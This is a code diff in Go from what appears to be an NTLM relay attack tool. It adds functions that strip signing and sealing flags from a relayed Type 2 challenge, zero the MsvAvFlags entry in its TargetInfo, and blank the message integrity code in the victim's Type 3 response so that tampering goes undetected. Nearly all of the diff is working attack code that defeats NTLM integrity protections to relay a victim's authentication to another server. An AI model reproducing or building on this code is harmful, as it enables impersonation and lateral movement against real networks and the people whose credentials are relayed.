@@ -73,21 +73,75 @@ func relayExtractType2Challenge(type2 []byte) []byte {
 	return challenge
 }
 
-// relayStripType2Signing clears NEGOTIATE_SIGN (0x10), NEGOTIATE_SEAL (0x20),
-// and NEGOTIATE_ALWAYS_SIGN (0x8000) from the Type 2 NegotiateFlags at offset
-// 20. This prevents the victim from negotiating signing in the Type 3, so the
-// relay target won't require integrity protection on subsequent operations.
+// relayStripType2Signing clears signing/sealing flags and removes the MIC
+// indicator from Type 2 AvPairs so the client won't compute an MIC that the
+// server will reject (since we modified the Type 2 message).
 func relayStripType2Signing(type2 []byte) []byte {
 	if len(type2) < 24 {
 		return type2
 	}
 	out := make([]byte, len(type2))
 	copy(out, type2)
+
 	flags := binary.LittleEndian.Uint32(out[20:24])
 	flags &^= 0x00000010 // NEGOTIATE_SIGN
 	flags &^= 0x00000020 // NEGOTIATE_SEAL
 	flags &^= 0x00008000 // NEGOTIATE_ALWAYS_SIGN
 	binary.LittleEndian.PutUint32(out[20:24], flags)
+
+	// Strip MsvAvFlags from TargetInfo AvPairs so client won't compute MIC.
+	// TargetInfo security buffer is at offset 40 in Type 2.
+	if len(out) >= 48 && flags&0x00800000 != 0 {
+		out = relayStripAvFlags(out)
+	}
+	return out
+}
+
+// relayStripAvFlags zeros MsvAvFlags (AvId=6) in the Type 2 TargetInfo AvPairs.
+// This prevents the client from setting the MIC_PROVIDED flag in its Type 3,
+// which would fail validation since we modified the Type 2.
+func relayStripAvFlags(type2 []byte) []byte {
+	if len(type2) < 48 {
+		return type2
+	}
+	tiBuf := readSecBuf(type2, 40)
+	tiData := tiBuf.getData(type2)
+	if tiData == nil {
+		return type2
+	}
+
+	off := int(tiBuf.Offset)
+	pos := 0
+	for pos+4 <= len(tiData) {
+		avID := binary.LittleEndian.Uint16(tiData[pos : pos+2])
+		avLen := binary.LittleEndian.Uint16(tiData[pos+2 : pos+4])
+		if avID == 0 { // MsvAvEOL
+			break
+		}
+		if avID == 6 && avLen == 4 && pos+4+int(avLen) <= len(tiData) {
+			// Zero out MsvAvFlags value
+			absOff := off + pos + 4
+			for i := 0; i < 4; i++ {
+				type2[absOff+i] = 0
+			}
+		}
+		pos += 4 + int(avLen)
+	}
+	return type2
+}
+
+// relayZeroType3MIC zeros the 16-byte MIC field at offset 72 in a Type 3
+// message. The MIC was computed against the original Type 2, but we modified
+// it (stripped signing flags and AvFlags), so the MIC would fail validation.
+func relayZeroType3MIC(type3 []byte) []byte {
+	if len(type3) < 88 {
+		return type3
+	}
+	out := make([]byte, len(type3))
+	copy(out, type3)
+	for i := 72; i < 88; i++ {
+		out[i] = 0
+	}
 	return out
 }
 
